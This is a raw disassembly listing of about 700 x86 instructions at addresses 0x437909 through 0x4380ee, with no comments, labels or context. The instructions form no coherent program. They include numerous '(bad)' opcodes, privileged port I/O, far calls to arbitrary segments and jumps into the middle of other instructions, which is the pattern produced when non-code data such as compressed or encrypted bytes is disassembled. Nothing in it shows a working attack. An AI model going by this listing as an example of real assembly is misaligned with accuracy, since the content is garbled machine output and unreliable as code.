  437909:	ins    BYTE PTR es:[edi],dx
  43790a:	or     eax,0x28ae74e9
  43790f:	popf   
  437910:	sbb    BYTE PTR [ecx],cl
  437912:	jns    0x4378c9
  437914:	or     ebp,DWORD PTR [bp+di-0x40fa]
  437919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43791a:	imul   edi,DWORD PTR [eax+0x4cb79496],0x7d
  437921:	xlat   BYTE PTR ds:[ebx]
  437922:	sub    al,0x5
  437924:	inc    edi
  437925:	or     DWORD PTR [edx+0x2c],ebp
  437928:	jge    0x4378d5
  43792a:	xchg   ecx,eax
  43792b:	jo     0x437951
  43792d:	rcl    edx,1
  43792f:	jo     0x437978
  437931:	in     eax,0xa6
  437933:	retf   0xa67a
  437936:	mov    al,ds:0x5cc52309
  43793b:	adc    DWORD PTR [esi],0xffffffa9
  43793e:	push   0x276bb23e
  437943:	add    ch,BYTE PTR [edx+eiz*4]
  437946:	jnp    0x437915
  437948:	in     eax,dx
  437949:	pushf  
  43794a:	std    
  43794b:	(bad)  
  43794c:	jmp    0x4378f3
  43794e:	fisub  WORD PTR [esi]
  437950:	mov    edi,0xc954eb25
  437955:	xchg   ebp,eax
  437956:	imul   esp,DWORD PTR [eax+0x31b65e12],0xffffff85
  43795d:	xlat   BYTE PTR ds:[ebx]
  43795e:	fsub   st,st(7)
  437960:	push   ebx
  437961:	repz cwde 
  437963:	xchg   ah,al
  437965:	pop    esp
  437966:	mov    eax,ds:0x17395565
  43796b:	jg     0x4379c9
  43796d:	(bad)
  437970:	jg     0x4379f1
  437972:	jb     0x437964
  437974:	lods   eax,DWORD PTR ds:[esi]
  437975:	push   0x3
  437977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437978:	xor    eax,0xa2e94d66
  43797d:	outs   dx,BYTE PTR ds:[esi]
  43797e:	cli    
  43797f:	or     BYTE PTR [esi],dl
  437981:	mov    DWORD PTR ds:0xd5073dcc,ebp
  437987:	out    dx,al
  437988:	push   ss
  437989:	popf   
  43798a:	jmp    0x4379d6
  43798c:	mov    dl,0x52
  43798e:	and    BYTE PTR [edx],ch
  437990:	in     eax,0x51
  437992:	adc    DWORD PTR [edx-0x4b141dd8],eax
  437998:	mov    ch,0x9b
  43799a:	cmp    BYTE PTR [ebx],ch
  43799c:	push   cs
  43799d:	push   ecx
  43799e:	out    dx,eax
  43799f:	call   0xc8ff:0x56ae5f1b
  4379a6:	mov    eax,0x77e95429
  4379ab:	add    al,0xe7
  4379ad:	arpl   WORD PTR [ecx+0x7b3de256],ax
  4379b3:	jo     0x43794e
  4379b5:	xor    eax,0x81fe6ee0
  4379ba:	mov    ecx,0x88852a84
  4379bf:	fwait
  4379c0:	push   0xffffff9f
  4379c2:	mov    edx,0x9a4e1024
  4379c7:	adc    eax,DWORD PTR [edi+0x24]
  4379ca:	jl     0x43797e
  4379cc:	jbe    0x4379ad
  4379ce:	mov    bl,0xf
  4379d0:	sbb    al,0x35
  4379d2:	mov    WORD PTR [esi],cs
  4379d4:	sbb    bl,BYTE PTR [ecx]
  4379d6:	push   edi
  4379d7:	sahf   
  4379d8:	int3   
  4379d9:	(bad)  
  4379da:	xor    ecx,DWORD PTR [ebx-0x121cbee7]
  4379e0:	push   es
  4379e1:	ds in  al,dx
  4379e3:	and    ebp,DWORD PTR [ebp-0x69]
  4379e6:	xor    eax,0xbf4479a6
  4379eb:	(bad)  
  4379ec:	popa   
  4379ed:	ja     0x4379ab
  4379ef:	mov    ebx,0x24cfd4dd
  4379f4:	xchg   edi,eax
  4379f5:	aam    0x5e
  4379f7:	push   eax
  4379f8:	sbb    ch,BYTE PTR [ebx]
  4379fa:	mov    ebx,esi
  4379fc:	inc    ebp
  4379fd:	shr    ecx,1
  4379ff:	repz mov al,ds:0x25259365
  437a05:	dec    ecx
  437a06:	sub    eax,0x7d2e8d57
  437a0b:	loope  0x437a5c
  437a0d:	adc    esi,DWORD PTR [ebx]
  437a0f:	cld    
  437a10:	inc    ebp
  437a11:	je     0x437a34
  437a13:	out    dx,eax
  437a14:	jae    0x4379bb
  437a16:	call   0x60bf7ff2
  437a1b:	enter  0x391a,0x34
  437a1f:	add    DWORD PTR [eax+0x2b0b6e37],edi
  437a25:	sub    eax,0xf566ad1d
  437a2a:	mov    edx,0x3225d9b4
  437a2f:	pop    esi
  437a30:	sub    esp,edx
  437a32:	mov    bh,0x14
  437a34:	mov    ah,0x64
  437a36:	sar    BYTE PTR [eax-0x51929013],1
  437a3c:	clc    
  437a3d:	adc    al,dl
  437a3f:	out    dx,al
  437a40:	add    DWORD PTR [edi-0x3959edcd],esp
  437a46:	dec    esi
  437a47:	mov    eax,0x34b8be49
  437a4c:	je     0x437ac1
  437a4e:	fdiv   DWORD PTR [ebp+esi*4-0x290e3c39]
  437a55:	mov    WORD PTR [eax+0x6a],ds
  437a58:	or     bl,BYTE PTR [edx]
  437a5a:	ret    0x76f8
  437a5d:	pushf  
  437a5e:	cmp    eax,0xc07c92c7
  437a63:	cmp    esi,DWORD PTR [ebp-0x6c]
  437a66:	sbb    ch,bh
  437a68:	or     BYTE PTR ds:0x19317ece,0xe0
  437a6f:	adc    DWORD PTR [edi-0x252c3691],esp
  437a75:	(bad)  
  437a76:	stc    
  437a77:	mov    ds:0xe61045c5,al
  437a7c:	cmp    al,0x6e
  437a7e:	xchg   edx,eax
  437a7f:	inc    ecx
  437a80:	sbb    cl,BYTE PTR [esi]
  437a82:	fstp   DWORD PTR [edi]
  437a84:	rcr    BYTE PTR [ecx+edx*2+0xa757690],cl
  437a8b:	adc    DWORD PTR [edx],esi
  437a8d:	mov    ds:0xb1c6170f,eax
  437a92:	stos   DWORD PTR es:[edi],eax
  437a93:	or     esp,DWORD PTR [edi]
  437a95:	xor    ch,bh
  437a97:	iret   
  437a98:	adc    BYTE PTR [edi+0x59],ah
  437a9b:	inc    edx
  437a9c:	pop    ds
  437a9d:	cmp    ebp,eax
  437a9f:	or     al,BYTE PTR [esi]
  437aa1:	cdq    
  437aa2:	sahf   
  437aa3:	mov    WORD PTR cs:[ebx+0x3c31801b],ds
  437aaa:	or     BYTE PTR [esi+0x70946158],bh
  437ab0:	jno    0x437b2e
  437ab2:	jnp    0x437aaa
  437ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437ab5:	adc    DWORD PTR [ecx-0xc],edx
  437ab8:	pop    es
  437ab9:	xlat   BYTE PTR ds:[ebx]
  437aba:	cdq    
  437abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437abc:	test   DWORD PTR [ebx],ebx
  437abe:	mov    edx,0xd3bdd7e7
  437ac3:	or     DWORD PTR [edx],esi
  437ac5:	pop    ecx
  437ac6:	adc    ebp,ebp
  437ac8:	and    esp,DWORD PTR [edi+0x65]
  437acb:	xchg   esp,eax
  437acc:	and    ebx,DWORD PTR [edi]
  437ace:	fwait
  437acf:	and    DWORD PTR [esi],0xcd02e7f4
  437ad5:	(bad)  
  437ad8:	and    al,0x1f
  437ada:	jmp    0x788e:0xe5191890
  437ae1:	loope  0x437b42
  437ae3:	mov    ah,0x54
  437ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ae6:	xchg   BYTE PTR [ebp+esi*4+0x30],ah
  437aea:	call   0xe142:0x5f013fef
  437af1:	mov    bl,BYTE PTR [esi]
  437af3:	jp     0x437b16
  437af5:	cmp    DWORD PTR [eax+edx*2],ecx
  437af8:	shl    DWORD PTR [ecx+0x4d],0xa5
  437afc:	adc    DWORD PTR [ebx],0x827866ac
  437b02:	scas   eax,DWORD PTR es:[edi]
  437b03:	xor    al,0x8f
  437b05:	mov    DWORD PTR [edx+esi*8-0x5fbf1698],ebx
  437b0c:	jb     0x437b59
  437b0e:	pop    es
  437b0f:	leave  
  437b10:	add    eax,0x57f4a231
  437b15:	push   ds
  437b16:	in     eax,0x73
  437b18:	pop    ebp
  437b19:	mov    dl,0xd0
  437b1b:	and    eax,0xc67ed692
  437b20:	and    DWORD PTR [ebx-0x4b],eax
  437b23:	inc    esp
  437b24:	xchg   edx,eax
  437b25:	test   al,0xb
  437b27:	push   esp
  437b28:	pop    esi
  437b29:	push   es
  437b2a:	sub    eax,0x1bfa0abf
  437b2f:	jns    0x437b93
  437b31:	push   ebp
  437b32:	and    al,0x5
  437b34:	sbb    BYTE PTR [ebp-0x72],dl
  437b37:	inc    edx
  437b38:	push   esp
  437b39:	test   eax,0xa27ab5e9
  437b3e:	cmp    esp,DWORD PTR [ebx+esi*2]
  437b41:	cli    
  437b42:	test   al,0xfc
  437b44:	stos   BYTE PTR es:[edi],al
  437b45:	pop    edi
  437b46:	iret   
  437b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437b48:	retf   
  437b49:	iret   
  437b4a:	mov    dh,0xf4
  437b4c:	scas   al,BYTE PTR es:[edi]
  437b4d:	inc    ebp
  437b4e:	iret   
  437b4f:	dec    ebx
  437b50:	aad    0xc0
  437b52:	cld    
  437b53:	in     eax,dx
  437b54:	test   eax,0xffc685ae
  437b59:	cld    
  437b5a:	ins    DWORD PTR es:[edi],dx
  437b5b:	and    BYTE PTR ds:0x9e5da889,0xc
  437b62:	xor    DWORD PTR [ecx-0x28],ecx
  437b65:	xchg   esi,eax
  437b66:	ins    DWORD PTR es:[edi],dx
  437b67:	nop
  437b68:	xchg   DWORD PTR [eax+0x38828887],esp
  437b6e:	push   esi
  437b6f:	adc    ebx,DWORD PTR [eax]
  437b71:	test   eax,0x18b6f571
  437b76:	in     al,dx
  437b77:	cld    
  437b78:	outs   dx,BYTE PTR ds:[esi]
  437b79:	mov    al,ds:0x863750eb
  437b7e:	push   esp
  437b7f:	lea    ecx,[ebx]
  437b81:	pop    edx
  437b82:	popa   
  437b83:	retf   
  437b84:	mov    cl,0x54
  437b86:	mov    cl,0xf4
  437b88:	aad    0x5
  437b8a:	(bad)  
  437b8b:	fs ss xor eax,0xa3f239da
  437b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437b93:	jae    0x437bf9
  437b95:	cmp    cl,bh
  437b97:	out    dx,eax
  437b98:	in     al,0x9c
  437b9a:	arpl   WORD PTR [eax+0x547fc830],bp
  437ba0:	jbe    0x437c21
  437ba2:	iret   
  437ba3:	dec    edi
  437ba4:	pop    ds
  437ba5:	test   eax,0xde12383
  437baa:	jmp    0x437b74
  437bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437bad:	sbb    al,0x32
  437baf:	aaa    
  437bb0:	ja     0x437b37
  437bb2:	xor    DWORD PTR [edx],esp
  437bb4:	imul   edi,DWORD PTR cs:[esp+eax*2+0x3e3a85e5],0x75
  437bbd:	add    ch,BYTE PTR [ecx-0x14]
  437bc0:	ss dec esi
  437bc2:	xor    eax,0x33591b1b
  437bc7:	and    eax,0xe49e5177
  437bcc:	loope  0x437b69
  437bce:	mov    esi,DWORD PTR [edi]
  437bd0:	arpl   WORD PTR [esi+eiz*4+0x5f22504a],di
  437bd7:	push   0x44bab56f
  437bdc:	pop    ss
  437bdd:	push   0x4d
  437bdf:	mov    DWORD PTR [edi+0x57c48265],eax
  437be5:	fwait
  437be6:	pop    ebx
  437be7:	adc    eax,0x56eb8139
  437bec:	and    bl,cl
  437bee:	imul   edi,DWORD PTR [edi],0x9e6c31eb
  437bf4:	fld    TBYTE PTR [ebx+ebx*8-0x1995eba5]
  437bfb:	pop    ds
  437bfc:	pop    ss
  437bfd:	and    al,0xb
  437bff:	dec    ecx
  437c00:	and    DWORD PTR [ecx+0x28693a11],edi
  437c06:	push   eax
  437c07:	lea    edi,[ebx*4+0x5f8eea6b]
  437c0e:	and    dl,dh
  437c10:	sub    bh,BYTE PTR fs:[edi]
  437c13:	dec    ebp
  437c14:	fidivr DWORD PTR [eax+0x7b07d4b8]
  437c1a:	fisub  WORD PTR [esi+0x29]
  437c1d:	sub    DWORD PTR [esi-0x40],edx
  437c20:	mov    al,ds:0x756cb1ce
  437c25:	out    dx,eax
  437c26:	call   0x95f0a5df
  437c2b:	xor    eax,0xe6693baf
  437c30:	jne    0x437c40
  437c32:	pop    esp
  437c33:	sti    
  437c34:	mov    al,0x44
  437c36:	outs   dx,BYTE PTR ds:[esi]
  437c37:	sub    edx,ebp
  437c39:	leave  
  437c3a:	stos   BYTE PTR es:[edi],al
  437c3b:	in     al,dx
  437c3c:	adc    BYTE PTR [eax+0x48],ch
  437c3f:	pop    esp
  437c40:	push   ss
  437c41:	fs ins DWORD PTR es:[edi],dx
  437c43:	(bad)  
  437c44:	sti    
  437c45:	adc    eax,0xfd5494b3
  437c4a:	sar    BYTE PTR [eax-0x1b],1
  437c4d:	push   esp
  437c4e:	ds call 0xe82f962b
  437c54:	cmp    edi,esi
  437c56:	test   DWORD PTR [ebp-0x5e],esi
  437c59:	aam    0xbd
  437c5b:	les    ebp,FWORD PTR [esi]
  437c5d:	mov    dh,0x85
  437c5f:	inc    esp
  437c60:	xchg   esi,eax
  437c61:	push   es
  437c62:	and    eax,0x862c3319
  437c67:	mov    dl,0xbc
  437c69:	pop    ss
  437c6a:	xor    esp,DWORD PTR [esp+ecx*2+0x5fb4bb06]
  437c71:	sub    al,0x59
  437c73:	mov    edi,0xeb005835
  437c78:	fidivr DWORD PTR [eax+0x91913e0]
  437c7e:	push   0xe85c08
  437c83:	or     al,0x35
  437c85:	jnp    0x437cc4
  437c87:	dec    esp
  437c88:	mov    dl,BYTE PTR ds:[ebp+0x3534adae]
  437c8f:	jmp    0xa91c:0x2b49e8f1
  437c96:	sbb    dl,BYTE PTR [esp+edi*4-0x6f0bb864]
  437c9d:	(bad)  
  437c9e:	pop    ecx
  437c9f:	popa   
  437ca0:	lds    esp,FWORD PTR ds:0x5511e552
  437ca6:	in     al,0x5b
  437ca8:	sbb    ecx,DWORD PTR [ecx]
  437caa:	mov    esp,0x8340e1b3
  437caf:	push   0xffffffeb
  437cb1:	mov    ds:0x18d7cbdb,al
  437cb6:	cmp    BYTE PTR [ebp+0x5f21c76],0xe8
  437cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437cbe:	in     al,0x84
  437cc0:	jae    0x437c90
  437cc2:	or     BYTE PTR [ebp-0x93ab9c0],ch
  437cc8:	push   edi
  437cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437cca:	sti    
  437ccb:	mov    al,0x4a
  437ccd:	cmp    ebp,esp
  437ccf:	ficom  DWORD PTR [edi]
  437cd1:	or     bh,BYTE PTR [ecx-0x683156b6]
  437cd7:	(bad)  
  437cd8:	cmp    esp,esi
  437cda:	mov    ebp,0xede58db0
  437cdf:	mov    WORD PTR [ebp-0x69],ss
  437ce2:	lods   al,BYTE PTR ds:[esi]
  437ce3:	mov    bl,0x1e
  437ce5:	mov    edi,0x5fa102f4
  437cea:	test   ch,0xb9
  437ced:	jl     0x437cae
  437cef:	mov    ah,0x98
  437cf1:	imul   esi,DWORD PTR [ecx+0x53],0x16
  437cf5:	inc    ecx
  437cf6:	add    DWORD PTR [ecx],esp
  437cf8:	imul   ebx,DWORD PTR [ecx],0xd38328b6
  437cfe:	xor    esp,DWORD PTR [ecx+0x2f]
  437d01:	add    eax,0x54f95590
  437d06:	aam    0xe5
  437d08:	bound  ebx,QWORD PTR [edi+0x6bfbd1eb]
  437d0e:	push   es
  437d0f:	xlat   BYTE PTR ds:[ebx]
  437d10:	std    
  437d11:	dec    ecx
  437d12:	add    dh,dl
  437d14:	xor    ebp,edx
  437d16:	mov    edx,0xcbb83304
  437d1b:	push   0xf28130d5
  437d20:	mov    al,0x6f
  437d22:	add    esi,esp
  437d24:	bound  edi,QWORD PTR [eax-0x635f1fa]
  437d2a:	mov    bl,0x84
  437d2c:	test   DWORD PTR [edx+ebp*1],ebp
  437d2f:	mov    eax,ebp
  437d31:	push   ebx
  437d32:	jns    0x437d28
  437d34:	test   BYTE PTR [ebp+0x1f],dl
  437d37:	xor    bl,BYTE PTR [ebx]
  437d39:	sub    BYTE PTR [edx-0x4c89f26e],bl
  437d3f:	push   esp
  437d40:	inc    esi
  437d41:	xchg   esi,eax
  437d42:	adc    esi,esp
  437d44:	and    eax,0x6be95824
  437d49:	imul   esp,DWORD PTR [esi+0x34],0x29dbf918
  437d50:	idiv   DWORD PTR [edi]
  437d52:	jae    0x437cf9
  437d54:	or     bl,BYTE PTR [edi+0x1b535e1b]
  437d5a:	sti    
  437d5b:	xchg   edi,eax
  437d5c:	cmp    DWORD PTR [edx],esp
  437d5e:	in     eax,0x88
  437d60:	mov    bl,0x35
  437d62:	into   
  437d63:	adc    al,0xb
  437d65:	mov    bl,0xfb
  437d67:	clc    
  437d68:	pop    eax
  437d69:	mov    bh,0x0
  437d6b:	icebp  
  437d6c:	ret    
  437d6d:	lea    ecx,[eax+ebp*8+0x39]
  437d71:	out    dx,eax
  437d72:	jle    0x437d4d
  437d74:	mov    al,ds:0x258eb0eb
  437d79:	stc    
  437d7a:	scas   eax,DWORD PTR es:[edi]
  437d7b:	mov    cl,0xcf
  437d7d:	std    
  437d7e:	dec    edx
  437d7f:	shl    WORD PTR [edx+0x9eb0c6b],0x3b
  437d87:	or     eax,0xbb592820
  437d8c:	mov    ebx,0x8eb4ec66
  437d91:	pop    ds
  437d92:	in     al,0x55
  437d94:	aas    
  437d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437d96:	jnp    0x437d1a
  437d98:	ret    
  437d99:	inc    esp
  437d9a:	call   0xc9b6:0x80334047
  437da1:	frstor [ecx]
  437da3:	push   ebp
  437da4:	and    eax,0x469e33ea
  437da9:	retf   
  437daa:	dec    ebx
  437dab:	sub    bl,BYTE PTR [esi]
  437dad:	sub    esi,0xffffffae
  437db0:	mov    ds:0x4370c287,al
  437db5:	cli    
  437db6:	fwait
  437db7:	jmp    0x8d4217b6
  437dbc:	xor    eax,0x9cf60b43
  437dc1:	es stc 
  437dc3:	jle    0x437d4e
  437dc5:	fisubr DWORD PTR [esi]
  437dc7:	push   0xffffffde
  437dc9:	lea    esi,[ebp-0xe1e6ff4]
  437dcf:	std    
  437dd0:	mov    edx,0x3ec79b1e
  437dd5:	fs mov ah,0xf4
  437dd8:	push   0xffffffa0
  437dda:	sti    
  437ddb:	jae    0x437def
  437ddd:	aaa    
  437dde:	sub    al,0x70
  437de0:	push   ss
  437de1:	xchg   DWORD PTR [esi-0x6ec6e438],edx
  437de7:	mov    ds:0xd6f86a21,eax
  437dec:	push   esp
  437ded:	leave  
  437dee:	jnp    0x437da4
  437df0:	fs out 0xdf,eax
  437df3:	dec    ebp
  437df4:	pop    ds
  437df5:	test   DWORD PTR [esp+eiz*4+0x19],ecx
  437df9:	jns    0x437d91
  437dfb:	test   eax,0x3b69a3
  437e00:	sub    al,0xd0
  437e02:	mov    edx,DWORD PTR [ecx]
  437e04:	arpl   WORD PTR [edx],di
  437e06:	add    ch,BYTE PTR ds:0xb8e6a909
  437e0c:	xlat   BYTE PTR ds:[ebx]
  437e0d:	mov    edi,0x355ea869
  437e12:	and    DWORD PTR [esi-0x334fa896],0x6a9baa22
  437e1c:	lahf   
  437e1d:	call   0x97de:0x8d0349f8
  437e24:	adc    DWORD PTR [esi-0x24],esp
  437e27:	je     0x437e7c
  437e29:	mul    ebx
  437e2b:	cmp    ah,dh
  437e2d:	loopne 0x437df8
  437e2f:	in     al,dx
  437e30:	push   ds
  437e31:	test   eax,0x78417670
  437e36:	xchg   esp,eax
  437e37:	mov    ebx,0x873b9d91
  437e3c:	sbb    esi,edi
  437e3e:	jns    0x437df5
  437e40:	dec    ch
  437e42:	mov    dh,0x9b
  437e44:	or     al,0x6
  437e46:	mov    ch,0x44
  437e48:	arpl   WORD PTR es:[ecx+0x2a5b15e6],cx
  437e4f:	repnz xchg esp,ebp
  437e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437e53:	addr16 and eax,0xb027d6d9
  437e59:	pop    eax
  437e5a:	mov    ecx,0x1ba8c4c0
  437e5f:	sub    esi,DWORD PTR [eax]
  437e61:	addr16 cwde 
  437e63:	in     eax,0xaf
  437e65:	retf   0x6e5a
  437e68:	retf   
  437e69:	lea    edi,[esp+edx*1-0x4d477fdd]
  437e70:	aam    0xa4
  437e72:	dec    ebx
  437e73:	inc    edi
  437e74:	(bad)  
  437e75:	mov    bl,0xa2
  437e77:	ins    DWORD PTR es:[edi],dx
  437e78:	in     eax,0xef
  437e7a:	jne    0x437eb4
  437e7c:	mov    al,0x9e
  437e7e:	out    dx,al
  437e7f:	mov    ah,0x53
  437e81:	sahf   
  437e82:	fld1   
  437e84:	and    al,0x91
  437e86:	sub    al,0x9a
  437e88:	clc    
  437e89:	push   0xeec678bf
  437e8e:	mov    ebp,0x9b0972be
  437e93:	and    cl,BYTE PTR [ecx+0x7c966c]
  437e99:	mov    ds:0xad80cb7,eax
  437e9e:	xor    eax,0x43fc0549
  437ea3:	hlt    
  437ea4:	jl     0x437e3b
  437ea6:	fwait
  437ea7:	adc    DWORD PTR [ebp-0x56],edi
  437eaa:	mov    edi,0x661eaba4
  437eaf:	arpl   bp,si
  437eb1:	repz retf 
  437eb3:	in     eax,0x57
  437eb5:	xchg   edi,eax
  437eb6:	mov    dl,0x89
  437eb8:	fstp   st(6)
  437eba:	test   al,0x55
  437ebd:	cld    
  437ebe:	ftst   
  437ec0:	sub    DWORD PTR [ebx],eax
  437ec2:	outs   dx,DWORD PTR ds:[esi]
  437ec3:	lds    esi,FWORD PTR [ebp+0x5bf1d1e1]
  437ec9:	idiv   DWORD PTR [eax+0x6a]
  437ecc:	dec    esi
  437ecd:	jns    0x437f27
  437ecf:	jmp    0xa525:0x45abf59d
  437ed6:	pop    esp
  437ed7:	mov    bl,0x81
  437ed9:	call   0xb6ab:0xde984a6
  437ee0:	xchg   esp,eax
  437ee1:	push   edx
  437ee2:	mov    bh,0x7c
  437ee4:	and    ebx,DWORD PTR [ebp+0x57]
  437ee7:	(bad)  [esi-0x1b]
  437eea:	mov    bl,0xa4
  437eec:	adc    al,BYTE PTR [ebp+0x5c558a8a]
  437ef2:	sbb    dh,ah
  437ef4:	mov    bl,bh
  437ef6:	cmp    DWORD PTR [ebx],ebp
  437ef8:	pop    ss
  437ef9:	leave  
  437efa:	sub    al,0x8d
  437efc:	xchg   edx,eax
  437efd:	rcl    DWORD PTR [ebp+0x24],cl
  437f00:	push   0xd0beb9b
  437f05:	aaa    
  437f06:	(bad)  
  437f07:	(bad)  
  437f08:	fisub  DWORD PTR [ebp-0x6c]
  437f0b:	int3   
  437f0c:	cli    
  437f0d:	(bad)  
  437f0e:	mov    dh,0x34
  437f10:	dec    esi
  437f11:	rol    DWORD PTR [eax],1
  437f13:	andnps xmm0,xmm6
  437f16:	sub    al,0xe8
  437f18:	mov    edi,0x9c2f1145
  437f1d:	inc    edi
  437f1e:	aad    0x62
  437f20:	sbb    al,BYTE PTR [ebx-0x46]
  437f23:	and    al,0x51
  437f25:	mov    eax,0x3246d5ea
  437f2a:	push   esi
  437f2b:	lds    ebx,FWORD PTR [edx]
  437f2d:	dec    ebp
  437f2e:	mov    ah,0xff
  437f30:	loope  0x437fae
  437f32:	pop    ebx
  437f33:	retf   0xd8ec
  437f36:	mov    ch,0x24
  437f38:	cmp    DWORD PTR [bx+0x63e],0x4
  437f3e:	in     eax,dx
  437f3f:	push   ebp
  437f40:	sub    BYTE PTR [edx+0x6461b46],bl
  437f46:	(bad)  
  437f47:	cmp    cl,BYTE PTR [eax+eiz*8]
  437f4a:	mov    bl,0xf4
  437f4c:	adc    DWORD PTR [edx-0x6d29c898],0x0
  437f53:	sbb    al,0x4c
  437f55:	jge    0x437f28
  437f57:	pop    esi
  437f58:	aaa    
  437f59:	dec    eax
  437f5a:	mov    ebp,0xb9476402
  437f5f:	in     al,0xe8
  437f61:	mov    ch,0xe7
  437f63:	(bad)  ds:0x14e5f6f1
  437f69:	push   ss
  437f6a:	daa    
  437f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437f6c:	pop    ds
  437f6d:	test   eax,0x7aa2fafc
  437f72:	pushf  
  437f73:	dec    esi
  437f74:	and    ebx,DWORD PTR [esi-0x36ba4c75]
  437f7a:	aam    0xc5
  437f7c:	lods   eax,DWORD PTR ds:[esi]
  437f7d:	pop    ebx
  437f7e:	xchg   ebx,eax
  437f7f:	jb     0x437f8d
  437f81:	in     eax,dx
  437f82:	mov    edx,0x28c141e4
  437f87:	add    al,0xb1
  437f89:	mov    al,ds:0x99816ceb
  437f8e:	cwde   
  437f8f:	int3   
  437f90:	cmc    
  437f91:	shl    DWORD PTR ds:0xbf4a6d4e,1
  437f97:	push   esp
  437f98:	pop    ss
  437f99:	nop
  437f9a:	cmp    ch,BYTE PTR [eax*2-0x17129768]
  437fa1:	stc    
  437fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437fa3:	jo     0x437ff4
  437fa5:	jmp    0x5e6270ac
  437faa:	mov    ebp,0x8804a066
  437faf:	out    0xdb,al
  437fb1:	push   ss
  437fb2:	scas   al,BYTE PTR es:[edi]
  437fb3:	lods   al,BYTE PTR ds:[esi]
  437fb4:	adc    bh,BYTE PTR [ecx-0x7b046b41]
  437fba:	shl    DWORD PTR [edi+0x3311f02f],1
  437fc0:	inc    eax
  437fc1:	cmp    DWORD PTR [esp+eiz*2-0x248aade],edi
  437fc8:	xor    eax,0xca3e6b1f
  437fcd:	mov    ds:0xbf490abb,eax
  437fd2:	jge    0x437feb
  437fd4:	bound  edi,QWORD PTR [edi+0x3]
  437fd7:	pushf  
  437fd8:	mov    ds:0x9b04b2c1,eax
  437fdd:	adc    al,0x6f
  437fdf:	(bad)  
  437fe0:	aad    0x5e
  437fe2:	nop
  437fe3:	repz pop edi
  437fe5:	sub    eax,0x79f94d4a
  437fea:	mov    ah,0xd8
  437fec:	into   
  437fed:	push   eax
  437fee:	lock outs dx,DWORD PTR ds:[esi]
  437ff0:	in     eax,dx
  437ff1:	and    al,0x51
  437ff3:	in     al,dx
  437ff4:	out    dx,al
  437ff5:	mov    dh,0x2b
  437ff7:	mov    DWORD PTR [eax+0x7321f575],edx
  437ffd:	sbb    DWORD PTR [eax-0x24d6e2f5],edi
  438003:	dec    ebp
  438004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438005:	and    cl,ch
  438007:	jo     0x438007
  438009:	ret    0x231c
  43800c:	mov    DWORD PTR [edx-0x1ec23155],esp
  438012:	dec    esp
  438013:	enter  0xf92d,0xf1
  438017:	xchg   esi,eax
  438018:	jmp    0x437fc0
  43801a:	sub    BYTE PTR [ebx],ch
  43801c:	sbb    DWORD PTR [eax],ebp
  43801e:	daa    
  43801f:	pop    esp
  438020:	cmp    eax,0x2339b05e
  438025:	mov    DWORD PTR [ecx],edx
  438027:	loope  0x438055
  438029:	mov    dh,0x66
  43802b:	inc    edi
  43802c:	imul   esp,eax,0x69
  43802f:	cwde   
  438030:	shl    BYTE PTR ss:[ebx],0xa4
  438034:	adc    bl,0xb6
  438037:	fs std 
  438039:	ror    DWORD PTR [ecx],cl
  43803b:	add    ch,0x38
  43803e:	(bad)  
  43803f:	jmp    0x81af72cd
  438044:	or     ecx,DWORD PTR [edx]
  438046:	rcr    esp,0xa
  438049:	mov    ah,BYTE PTR [ebx-0x665ef33e]
  43804f:	cmp    eax,0xa0c9421f
  438054:	dec    ebp
  438055:	test   al,0x9b
  438057:	push   eax
  438058:	xlat   BYTE PTR ds:[ebx]
  438059:	pop    ss
  43805a:	jl     0x4380c7
  43805c:	dec    ecx
  43805d:	cmc    
  43805e:	inc    ebx
  43805f:	xlat   BYTE PTR ds:[ebx]
  438060:	push   ds
  438061:	jmp    0x708be024
  438066:	(bad)  
  438067:	push   ebp
  438068:	or     al,0xa5
  43806a:	sub    edi,edi
  43806c:	xchg   ebp,eax
  43806d:	daa    
  43806e:	aaa    
  43806f:	enter  0x8f1b,0x39
  438073:	ins    BYTE PTR es:[edi],dx
  438074:	mov    BYTE PTR [edi*4-0x7558277c],dh
  43807b:	gs xchg ebp,eax
  43807d:	ficomp DWORD PTR ds:0x50df7be5
  438083:	mov    es,WORD PTR [ecx-0x70d8f268]
  438089:	fst    DWORD PTR ds:0x9e6cb9d4
  43808f:	out    dx,eax
  438090:	stos   BYTE PTR es:[edi],al
  438091:	sub    al,0xbb
  438093:	mov    eax,0xf0bb70c5
  438098:	fwait
  438099:	mov    al,0x6e
  43809b:	push   ecx
  43809c:	and    bl,BYTE PTR [ecx-0x31]
  43809f:	sti    
  4380a0:	ins    BYTE PTR es:[edi],dx
  4380a1:	fnstenv [edx]
  4380a3:	in     eax,0xa
  4380a5:	call   0x6c0d:0x9d8f433b
  4380ac:	int    0x9f
  4380ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4380af:	dec    edx
  4380b0:	jg     0x438040
  4380b2:	cmc    
  4380b3:	adc    al,0x21
  4380b5:	add    DWORD PTR [esi+0x15],esp
  4380b8:	retf   0x9c16
  4380bb:	dec    edx
  4380bc:	out    0xf9,eax
  4380be:	xchg   DWORD PTR [esi],ecx
  4380c0:	adc    dh,dl
  4380c2:	paddsb mm3,QWORD PTR [ecx+ecx*8]
  4380c6:	das    
  4380c7:	pop    es
  4380c8:	mov    ah,0x99
  4380ca:	enter  0x3212,0x5a
  4380ce:	push   eax
  4380cf:	cmp    esp,ecx
  4380d1:	cdq    
  4380d2:	mov    al,fs:0x62e12b24
  4380d8:	jb     0x8e73d599
  4380de:	lock aam 0x45
  4380e1:	cs xchg ebx,eax
  4380e3:	jmp    0xa0a5:0x4ab5e56e
  4380ea:	or     DWORD PTR [eax+0x2],esp
  4380ed:	popf   
  4380ee:	mov    edx,0x8db68224
